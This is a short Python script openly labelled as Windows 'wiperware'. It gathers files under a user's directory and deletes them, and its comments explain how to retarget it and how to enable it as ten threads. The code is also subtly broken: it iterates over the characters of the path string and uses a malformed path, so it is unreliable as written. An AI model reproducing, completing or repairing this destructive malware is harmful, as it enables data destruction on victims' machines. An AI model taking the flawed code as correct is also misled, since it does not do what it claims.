############################################################################################################################
# Developer: 3ratic                                                                                                        #
#                                                                                                                          #
# Whippet Windows Wiperware                                                                                                #
############################################################################################################################

import os, getpass, threading

def main():
    user = getpass.getuser()
    path = f'C://{user}' #Change this to whatever file path you want to target
    files = []

    for file in path:
        if file == 'main.py':
            continue
        files.append(file)

    for file in files:
        os.remove(file)

threads = 10 #Add more if you'd like

#for _ in range(threads): #Remove comment
    #threading.Thread(target=main).start() #Remove the hashtag to activate

